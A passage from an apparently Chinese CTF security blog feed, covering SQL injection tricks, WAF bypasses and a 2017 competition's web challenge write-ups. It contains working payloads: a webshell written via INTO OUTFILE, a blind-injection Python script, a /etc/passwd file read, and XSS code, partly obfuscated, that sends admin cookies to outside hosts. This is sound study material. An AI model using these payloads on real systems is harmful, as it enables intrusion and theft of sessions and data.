class="code"><pre><div class="line">select * from user where username=&apos;&apos; and</div><div class="line"> (select * from </div><div class="line">(select * from user as a join user as b [开始为空之后逐个为using(爆出的column)])</div><div class="line">  as e);</div><div class="line">output: ERROR 1060 (42S21): Duplicate column name &apos;password&apos;</div><div class="line">可以爆出所有的字段名，原理：select table as c时是要求table中不能有重复列的，</div><div class="line">先使用select * from user as a join user as b 构建出有重复列的表，之后select 这个表 as c即可</div></pre></td></tr></table></figure></p><p>在能够使用的注入点将要拿的数据先存到变量里，之后被限制的注入点读取变量即可<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'admin'</span> <span class="keyword">into</span> @a,@b,@c,@d;</div><div class="line">之后读取@a @b @c @d 这四个变量就可以了</div></pre></td></tr></table></figure></p><h3 id="日常测试中发现的"><a href="#日常测试中发现的" class="headerlink" title="日常测试中发现的"></a>日常测试中发现的</h3><p>在已经知道表名，其中一个字段名的时候，可以爆出来其他的字段名，与数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>));</div><div class="line">output:</div><div class="line">ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">`blog`</span>.<span class="string">`user`</span>.<span class="string">`password`</span> separator <span class="string">','</span>) <span class="keyword">from</span> <span class="string">`blog`</span>.<span class="string">`user`</span>)))<span class="string">'</span></div></pre></td></tr></table></figure><h2 id="一些零碎记录的点"><a href="#一些零碎记录的点" class="headerlink" title="一些零碎记录的点"></a>一些零碎记录的点</h2><ol><li><p>针对sql注入做的waf防护，常见的有以下几种</p><ul><li>采用mysqli_escape_string(),addslashes()这种转义型的过滤，如果没有其他额外人为操作的话，在这个sql点就是安全，那仍然会保留’这种脏数据，所以要留意会不会在其他sql点造成二次注入</li><li>自己写filter函数，对某些关键字啊，空格啊，符号啊禁用，也是常常产生绕过的地方，比如双写绕过啊，使用其他相同意义的函数啊，空格用%0a代替啊这些。一些比较奇葩的过滤规则可能会引入威胁，就比如国赛帽子的那道题目</li><li>waf函数，如果检测到敏感字符会die掉进程，也是经常进行绕过的地方</li><li>使用PDO结构的sql对象，进行-&gt;perpare预处理之后，那参数就是参数，语句就是语句，基本很难形成注入</li></ul></li><li><p>除了针对各种sql点上过滤的绕过，还有几种情况是值得考虑的</p><ul><li>如果参数其实并没有被过滤呢？就像TCTF上那道题目，全局参数过滤了GET POST ,然而一个参数点使用的是REQUEST[‘username’]来获得的参数，那其实这注入点的参数并没有被过滤</li><li>有些注入点的参数并不是自定义的，但有可能其最终来源还是用户自定义的，而且来源收录的时候只是进行了转义，记录的数据仍然为脏数据，这样这些存储值不经过滤的传到其他注入点做参数就会构成二次注入。（个人感觉二次注入在黑盒审计中出现的场景比代码审计要多，而且经常出现在用户名注册，之后一些操作直接提取用户名去进行sql操作）</li></ul></li><li><p>TCTF里有一道很有意思的注入题目，是关于列名这个参数点注入的，那个题目使用CI框架写的，在$this-&gt;db-&gt;select()-&gt;from()-&gt;where()的select()这个函数里面装的是列名，这个参数在题目中可以由我们自定义，当然做了很多过滤，同时CI框架本身也做了很多过滤，wupco师傅对其进行了仔细分析<a href="http://www.wupco.cn/?p=3646" title="http://www.wupco.cn/?p=3646" target="_blank" rel="external">http://www.wupco.cn/?p=3646</a>，小m师傅当时用了xdebug对运行代码进行了调试，可能也是为了搞清楚CI框架内部做了什么过滤，发现后面加一对’’就没有过滤了。具体的过滤分析找时间再细看，这次先学习下列名注入<br><code>select column_name from test</code>,在column_name可控制下，我们这样写<br><code>select {table_name from information_schema.tables where table_schema=&#39;blog&#39; union select 1} from test</code>这样就可以构造注入了</p></li><li><p>在数据库的登陆用户为root时，有可能是可以在任意目录下写文件的，这样我们就可以写一个webshell出来了<br><code>union select &quot;&lt;?php system($_GET[‘c’]);?&gt;&quot; into outfile &#39;/var/www/html/uploads/shell.php&#39;</code><br>实际情况测试的时候，在wamp中发现报错：<code>The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code>，在sql.ini下将secure-file-priv注释掉就好了<br>在kali的mysql中测试时发现，文件是可以写的，但尝试在/var/www/html/中写文件的时候，显示没有权限，就算是改用root账户登陆也不行，这时其实就是目标文件夹的权限配置问题了，一般网页根目录下的upload/文件是可以写文件进去的。当然前提还得是mysql以root登陆才能有写文件的权限</p></li><li><p>基于语义的waf学习（先占坑有时间加上去）</p></li><li><p>这一条留给自己看，尝试考虑下拿到一个sql点的时候手注的顺序，因为感觉很多sql点加一点过滤就会在测试的时候各种懵逼，还是找个比较好的测试顺序比较好</p><ul><li><code>&#39;</code>有可能没有回显，有报错回显，有waf提示</li><li><code>&#39; or 1</code> <code>&#39; or &#39;&#39;=&#39;</code> 看看有没有全部东西出来，主要是看看这种简单的会不会拦截，</li><li><code>&#39; union select 1,2,3,4 %23</code> 看看能不能使用union查询</li><li>到此为止如果看到了waf信息，报错信息，就可以着手开始搞了。如果还没有东西，可以开始用burp测试一波敏感字符了，基于看到的特殊信息对上面的payload做出替换后再尝试</li><li>如果还没有看到异常情况，那可能点就是封死了，因为能够执行sql的话，上面的结果肯定会有些特殊回显的</li></ul><p>​</p><p>​</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;对ctf题目中盲注思路以及waf绕过的总结&lt;/li&gt;
&lt;li&gt;sqlmap的参数学习（算了不写了，直接看小m师傅的吧，文笔比我好多了。。&lt;a href=&quot;http://www.melodia.pw/?p=918&quot; title=&quot;SQLMAP 人工辅助注入简介&quot;&gt;http://www.melodia.pw/?p=918&lt;/a&gt;）&lt;/li&gt;
&lt;li&gt;其他不好分类的，零碎想记录的
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>全国大学生信息安全竞赛web部分wp</title>
    <link href="https://someonesometimes.github.io/2017/07/11/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%83%A8%E5%88%86wp/"/>
    <id>https://someonesometimes.github.io/2017/07/11/全国大学生信息安全竞赛web部分wp/</id>
    <published>2017-07-11T07:29:44.000Z</published>
    <updated>2017-10-01T16:40:56.106Z</updated>
    
    <content type="html"><![CDATA[<p>比赛好不人性啊，连着24小时，还半夜放题，感觉结束后快猝死了2333。看着其它队伍的表哥嗖嗖的日题也只有喊666的份了，当然对于我这种小白来说重点还是在于赛后的总结学习，嘛，开始吧。</p><a id="more"></a><h2 id="PHP-execise"><a href="#PHP-execise" class="headerlink" title="PHP execise"></a>PHP execise</h2><p>题目给出了php代码的执行环境可以执行任意代码，估计就是<code>&lt;?php eval($_GET[&#39;c&#39;])?&gt;</code>来实现的，出题本意应该是考察选手在禁用函数的情况下拿到flag。所以首先上来要看禁用了那些函数。输入<code>phpinfo();</code>后搜索<code>disable_functions</code>查看禁用函数，可以看到shell命令执行，文件包含等函数都被禁用了，然后下面是就是猜测flag到底藏在了哪里。<br>受以前百度杯的一道题的影响，首先查看了这个php文件的全局变量，测试<code>var_dump($GLOBALS);</code>，没有发现，然后试着<code>var_dump($flag);</code>也没有结果。所以就卡住了。。。果然还是太菜，然而峰回路转，就在我刷新页面的时候，突然给出了目录结构，然后就看到了一个疑似flag的php文件，遂想到flag可能放到其他文件里了，需要目录扫描，刚好前几天做过，于是<code>var_dump(scandir(&#39;./&#39;));</code>一发顺利拿到文件名<br><img src="http://i.imgur.com/Bn7ertd.png" alt=""><br>之后包含文件读取flag就好了<code>require_once(&#39;flag_62cfc2dc115277d0c04ed0f74e48e3e9.php&#39;);echo $flag;</code>成功拿到flag<br><img src="http://i.imgur.com/9oU5VP4.png" alt=""></p><p>相同的思路，通过看学长的wp又学习了其他函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#glob()是一个对文件目录进行搜索并返回匹配正则表达式的函数，所以也可以做文件扫描</span></div><div class="line">glob(<span class="string">'./*'</span>);</div><div class="line"></div><div class="line"><span class="comment">#highlight(__FILE__)是一个可以以高亮显示文本内容的函数，比赛中有时会直接给出php源码一般就是用这个函数来显示的</span></div><div class="line">highlight_file(<span class="string">'./flag_62cfc2dc115277d0c04ed0f74e48e3e9.php'</span>);</div><div class="line"></div><div class="line"><span class="comment">#show_source(__FILE__)也可以用于展示文件的详细情况</span></div></pre></td></tr></table></figure></p><h2 id="wanna-to-see-your-hat"><a href="#wanna-to-see-your-hat" class="headerlink" title="wanna to see your hat?"></a>wanna to see your hat?</h2><p>打开网站看了看，所有的页面都会重定向到route.php这个页面来，然后就是输入用户名显示帽子颜色啥的，输入点简单试了试没有注入思路，然后也看了页面html源码以及http头，也没有发现异常情况，所以考虑是不是代码审计题目，随手扫下目录发现.svn源码泄露，没有用专门的恢复工具，直接在文件中找到了github的地址，访问后分析下的确是比赛题目的环境，下载下来开始代码审计。<br>可以看到$_POST $_GET都经过了转义，这种情况下要么参数从其他地方获取如$_REQUEST,然后是二次注入。ok，我们去找sql点，一共有两个。<br>一个在register页面，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="string">"insert into t_user (username,nickname,password)  values('"</span>.$_POST[<span class="string">'username'</span>].<span class="string">"', '"</span>.$_POST[<span class="string">'nickname'</span>].<span class="string">"','"</span>.md5($_POST[<span class="string">'password'</span>]).<span class="string">"')"</span>;</div><div class="line">  <span class="keyword">if</span> (mysql_query($sql))&#123;</div><div class="line">    header(<span class="string">"Location: ./route.php?act=login"</span>);</div><div class="line">    <span class="keyword">exit</span>();</div></pre></td></tr></table></figure></p><p>就是从过滤后的$_POST中提取参数，所以至少这个点应该是没法用的，最多可能会有二次注入。</p><p>另一个在login界面，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">defined(<span class="string">'black_hat'</span>) <span class="keyword">or</span> header(<span class="string">'Location: route.php?act=login'</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">include_once</span> <span class="string">"common.php"</span>;</div><div class="line">$connect=mysql_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"haozigege"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"there is no ctf!"</span>);</div><div class="line">mysql_select_db(<span class="string">"hats"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"there is no hats!"</span>);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"name"</span>]))&#123;</div><div class="line">  $name = str_replace(<span class="string">"'"</span>, <span class="string">""</span>, trim(waf($_POST[<span class="string">"name"</span>])));</div><div class="line">  <span class="keyword">if</span> (strlen($name) &gt; <span class="number">11</span>)&#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;script&gt;alert('name too long')&lt;/script&gt;"</span>);</div><div class="line">  &#125;<span class="keyword">else</span>&#123;</div><div class="line">    $sql = <span class="string">"select count(*) from t_info where username = '$name' or nickname = '$name'"</span>;</div><div class="line">    <span class="keyword">echo</span> $sql;</div><div class="line">    $result = mysql_query($sql);</div><div class="line">    $row = mysql_fetch_array($result);</div><div class="line">    <span class="keyword">if</span> ($row[<span class="number">0</span>])&#123;</div><div class="line">      $_SESSION[<span class="string">'hat'</span>] = <span class="string">'black'</span>;</div><div class="line">      <span class="keyword">echo</span> <span class="string">'good job'</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">$_SESSION[<span class="string">'hat'</span>] = <span class="string">'green'</span>;</div><div class="line">    &#125;</div><div class="line">    header(<span class="string">"Location: index.php"</span>);</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($value)</span></span>&#123;</div><div class="line">    $Filt = <span class="string">"\bUNION.+SELECT\b|SELECT.+?FROM"</span>;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$Filt.<span class="string">"/is"</span>,$value)==<span class="number">1</span>)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"found a hacker"</span>);</div><div class="line">    &#125;</div><div class="line">    $value = str_replace(<span class="string">" "</span>,<span class="string">""</span>,$value);  </div><div class="line">    <span class="keyword">return</span> $value;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">d_addslashes</span><span class="params">($array)</span></span>&#123;</div><div class="line">        <span class="keyword">foreach</span>($array <span class="keyword">as</span> $key=&gt;$value)&#123;</div><div class="line">        <span class="keyword">if</span>(!is_array($value))&#123;</div><div class="line">            !get_magic_quotes_gpc() &amp;&amp; $value=addslashes($value);</div><div class="line">            waf($value);</div><div class="line">            $array[$key]=$value;</div><div class="line">        &#125;   </div><div class="line">    &#125;   </div><div class="line">    <span class="keyword">return</span> $array;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>和第一个sql点的数据没有关系，所以不是二次注入，本来如果就只是转义处理的话这个点就是安全的，但是它作死的在参数处理流程中加了一些东西。。。</p><ul><li>把经过转义后的参数中的单引号都去掉</li><li>对union select | select from 做了过滤</li><li>转义函数中没有对两层数组过滤，并且过滤函数中加了waf($value)</li></ul><p>最后一个没有发现利用方式<br>第二个过滤其实没有必要，因为参数长度限制在了11，所以也不会用这两种写法，而且想绕过也很简单，我们可以看到在waf函数中检测完后将’ ‘去掉了，所以<code>sel ect from  un ion select</code>就可以绕过，并且过滤结束后又变回正常语句<br>第一个过滤是本题关键所在，因为在转义过滤中会在’前面加上\，之后再把’去掉后就只剩下\了，我们来观察下sql语句：<br><code>select count(*) from t_info where username = &#39;$name&#39; or nickname = &#39;$name&#39;</code><br>name参数如果最后一个字符是’的话，过滤后最后一个字符就变成了\,所以就把后一个单引号转义掉了，这样第一个单引号和第三个单引号成对，我们就实现了单引号闭合，在外面写东西了，通过or 1’就可以满足登陆需求了，但还有个问题是，在语句最后会有一个\’影响执行，就考虑怎么去掉他，我们来看前后两个name的环境，一个是在’’里面，另一个是作为功能性语句出现，所以我们写成or 1#’并不会导致在第一个name处出现问题，于是就能拿到flag了。<br><img src="http://i.imgur.com/ep2qmez.png" alt=""></p><h2 id="方舟计划"><a href="#方舟计划" class="headerlink" title="方舟计划"></a>方舟计划</h2><p>扫描后没有发现源码泄露，然后在注册点的phone参数上发现了注入点，输入’会有报错产生，结合环境是insert语句来看应该是报错注入，正好前几天看到了Ben师傅的一个报错注入的利用，测试后诸如<code>&#39; or if(substring(( {payload} ),{},1)=binary(&#39;{}&#39;),0,1) and ST_LatFromGeoHash(version()) or &#39;</code>语句可以利用，但关键是我卡死在了waf上！！！哎，还是太菜，<code>/*!*/</code>的绕过方式明明以前用过好多次，但比赛的时候就是没有想到，在简单尝试了几种绕过方式后，思路竟然转向了如何不利用from来拿数据上，结果就进了死胡同，正好这几天打算把sql盲注总结下，把思路都总结下来，省得注入的时候漏掉什么。<br>哎，接下来就是看的其他师傅的思路了，这里盲注可以利用，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">s = requests.session()</div><div class="line">url = <span class="string">"http://120.132.54.253/index.php?a=doregister"</span></div><div class="line">data = &#123;<span class="string">"username"</span>:<span class="string">"1"</span>,<span class="string">"phone"</span>:<span class="string">""</span>,<span class="string">"password"</span>:<span class="string">"1"</span>,<span class="string">"repassword"</span>:<span class="string">"1"</span>&#125;</div><div class="line">payload = <span class="string">""</span> <span class="comment">#此处填写payload</span></div><div class="line"></div><div class="line">answer = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</div><div class="line">        temp = chr(i)</div><div class="line">        data[<span class="string">'phone'</span>] = <span class="string">"' or if(substring((&#123;&#125;),&#123;&#125;,1)=binary('&#123;&#125;'),0,1) and ST_LatFromGeoHash(version()) or '"</span>.format(payload,<span class="string">'-'</span>+str(j),temp)</div><div class="line">        retu = s.post(url=url, data=data).content</div><div class="line">        <span class="keyword">if</span> retu == <span class="string">'success'</span>:</div><div class="line">            answer += temp</div><div class="line">            <span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> answer[::<span class="number">-1</span>]</div></pre></td></tr></table></figure></p><p>从config表中拿到用户名和密码，之后登陆进去，是一个上传.avi文件然后转成.md4的地方，然后表哥们都很快想到是ffmpeg任意文件读取漏洞，然而我并没有听说过，下面贴出来地址，同样不清楚ffmpeg任意文件读取漏洞的小伙伴们也来了解下吧<br><a href="http://blog.cyberpeace.cn/FFmpeg/" title="http://blog.cyberpeace.cn/FFmpeg/" target="_blank" rel="external">http://blog.cyberpeace.cn/FFmpeg/</a></p><p>除此之外，目录读取过程中个，还存在过滤，应该就是匹配过滤，绕过也很简单，通过跨目录来绕过`file:///etc/init.d/../passwd 3.avi</p><p>个人而言还要记录下任意文件读取漏洞下获取flag的思路，表哥们首先读取了/etc/passwd文件拿到所有用户名列表后去对应的host目录下去拿flag，在这点上我的思路还是不够开阔。</p><h2 id="Guest-Book"><a href="#Guest-Book" class="headerlink" title="Guest Book"></a>Guest Book</h2><p>一道xss题目，测试一番后情况如下：</p><h3 id="防御措施："><a href="#防御措施：" class="headerlink" title="防御措施："></a>防御措施：</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">CSP:</div><div class="line">default-src 'self';</div><div class="line">script-src 'self' 'unsafe-inline' 'unsafe-eval';  </div><div class="line">font-src 'self' fonts.gstatic.com;  </div><div class="line">style-src 'self' 'unsafe-inline';  </div><div class="line">img-src 'self'</div><div class="line"></div><div class="line">sandbox:</div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="comment">//sandbox</span></div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.Function;</div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.eval;</div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.alert;</div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.XMLHttpRequest;</div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.Proxy;</div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.Image;</div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.postMessage;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line">后台数据过滤：</div><div class="line">一些标签如<span class="tag">&lt;<span class="name">link</span>&gt;</span>，一些DOM属性如location等被替换为了hacker</div></pre></td></tr></table></figure><p>参数注入点：</p><ul><li>一个在主页中提交，将由管理员触发，触发页面是个html文件，<br><code>http://106.75.119.64:8888/uploads/2017-07-10-05-08-29-8cY7kyvOpoND.html</code>像这样会每次变化</li><li>还有一个重命名的xss点，回显处在主页上</li></ul><h3 id="题目拿取flag思路"><a href="#题目拿取flag思路" class="headerlink" title="题目拿取flag思路"></a>题目拿取flag思路</h3><p>这道题目的flag存放在cookie中，尝试了读取触发页面，以及触发页面的cookie都没有有效数据，然后也没有明确的提示信息说只有admin可以进行访问，之后就可以考虑flag存放在子目录的cookie的情况了，我们尝试读取触发页面的document.referer可以看到触发点是<code>http://106.75.119.64:8888/admin/review.php</code>，然后再xss接收中可以看到访问请求的来源是<code>http://106.75.119.64:8888/uploads/2017-07-10-05-08-29-8cY7kyvOpoND.html</code>，所以bot的机制应该是首先访问review.php，然后被重定向到写有我们js代码的html文件，两个文件并不在同一个目录，所以我们要做的就是去访问/admin目录下的文件，然后读取cookie</p><h3 id="综合自己发现的以及表哥们的绕过思路做个统计："><a href="#综合自己发现的以及表哥们的绕过思路做个统计：" class="headerlink" title="综合自己发现的以及表哥们的绕过思路做个统计："></a>综合自己发现的以及表哥们的绕过思路做个统计：</h3><p><strong>对后台数据过滤的绕过</strong></p><ol><li>可以使用window[‘loca’+’tion’].href这种写法来绕过检测</li><li>可以使用eval来绕过使用检测 eval(‘loca’+’tion’).href</li><li>对于标签可以改为js动态建立来进行绕过</li><li>因为csp允许了unsafe-eval</li></ol><p><strong>对沙盒的绕过</strong></p><ol><li>可以建立一个iframe就可以避免沙盒的函数禁用了</li><li>index.php是不存在沙盒的，而且存在xss的重命名触发点，所以将admin进行重命名，之后定位到index.php执行基于名字的js代码就可以</li></ol><h3 id="收集并分析做题的思路"><a href="#收集并分析做题的思路" class="headerlink" title="收集并分析做题的思路"></a>收集并分析做题的思路</h3><p><strong>From Ben师傅</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:</span></span></div><div class="line">i=document.createElement('iframe');</div><div class="line">i.src='/admin/review.php?b=2e232 e23';</div><div class="line">i['onlo'+'ad']=function()&#123;</div><div class="line">parent.window['locat'+'ion'].href='http://xss/'+escape(this.contentWindow.document.cookie)&#125;; document.body.append(i)"&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div></pre></td></tr></table></figure></p><p>分析：</p><p>使用src标签的javascript伪协议来书写js代码，<br>使用js代码动态构建一个iframe来获得内容，这样就可以不绕过对xhr的禁用<br>之后对父窗口进行重定向到xss平台来实现数据传送</p><p><strong>From Lorexxar</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"re"</span> <span class="attr">action</span>=<span class="string">"../rename.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"nname"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;script&gt;eval(String.fromCharCode(118, 97, 114, 32, 105, 102, 114, 97, 109, 101, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 105, 102, 114, 97, 109, 101, 34, 41, 59, 10, 105, 102, 114, 97, 109, 101, 46, 115, 114, 99, 32, 61, 32, 34, 46, 47, 97, 100, 109, 105, 110, 47, 34, 59, 10, 105, 102, 114, 97, 109, 101, 46, 105, 100, 32, 61, 32, 34, 102, 114, 97, 109, 101, 34, 59, 10, 100, 111, 99, 117, 109, 101, 110, 116, 46, 98, 111, 100, 121, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 105, 102, 114, 97, 109, 101, 41, 59, 10, 10, 105, 102, 114, 97, 109, 101, 46, 111, 110, 108, 111, 97, 100, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 41, 123, 10, 32, 32, 9, 118, 97, 114, 32, 99, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 66, 121, 73, 100, 40, 39, 102, 114, 97, 109, 101, 39, 41, 46, 99, 111, 110, 116, 101, 110, 116, 87, 105, 110, 100, 111, 119, 46, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 59, 10, 10, 9, 118, 97, 114, 32, 110, 48, 116, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 108, 105, 110, 107, 34, 41, 59, 10, 9, 110, 48, 116, 46, 115, 101, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 40, 34, 114, 101, 108, 34, 44, 32, 34, 112, 114, 101, 102, 101, 116, 99, 104, 34, 41, 59, 10, 9, 110, 48, 116, 46, 115, 101, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 40, 34, 104, 114, 101, 102, 34, 44, 32, 34, 47, 47, 48, 120, 98, 46, 112, 119, 47, 63, 34, 32, 43, 32, 99, 41, 59, 10, 9, 100, 111, 99, 117, 109, 101, 110, 116, 46, 104, 101, 97, 100, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 110, 48, 116, 41, 59, 10, 125))&lt;/script&gt;"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">'re'</span>).submit()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line">那一长串数值转换后为：</div><div class="line">var iframe = document.createElement("iframe");</div><div class="line">iframe.src = "./admin/";</div><div class="line">iframe.id = "frame";</div><div class="line">document.body.appendChild(iframe);</div><div class="line"></div><div class="line">iframe.onload = function ()&#123;</div><div class="line">  var c = document.getElementById('frame').contentWindow.document.cookie;</div><div class="line"></div><div class="line">var n0t = document.createElement("link");</div><div class="line">n0t.setAttribute("rel", "prefetch");</div><div class="line">n0t.setAttribute("href", "//0xb.pw/?" + c);</div><div class="line">document.head.appendChild(n0t);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>分析：<br>首先使用表单提交的方式来进行发出POST请求进行重命名操作，绕过对xhr的禁用<br>命名之后会自动跳转回index.php，触发rename处的xss点<br>建立iframe标签拿到对应页面的详细数据<br>在iframe的onload上编写事件，通过建立link标签来将数据传递到xss面板<br>之所以要利用rename这里的xss点就是因为这里没有sandbox，没禁用eval就可以使用eval(‘loca’+’tion’)这种写法了</p><h2 id="flag-vending-machine"><a href="#flag-vending-machine" class="headerlink" title="flag vending machine"></a>flag vending machine</h2><p>一道二次注入的题目，在用户注册那里使用的转义型过滤，然后扣除钱的时候根据用户的username来扣钱，所以在扣钱的这里就形成了二次注入，然后就可以通过是否买东西后会扣除相应的钱来做布尔型盲注。<br>比赛的时候一直在考虑条件竞争，尽管前几天刚刚学了二次注入，还是没有想到，所以最后也没有做出来，payload就不贴了，有兴趣的可以去看看Lo师傅的payload，因为听说还有一些简单的过滤啥的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;比赛好不人性啊，连着24小时，还半夜放题，感觉结束后快猝死了2333。看着其它队伍的表哥嗖嗖的日题也只有喊666的份了，当然对于我这种小白来说重点还是在于赛后的总结学习，嘛，开始吧。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一个博客爬取网站的设计思路与流程</title>
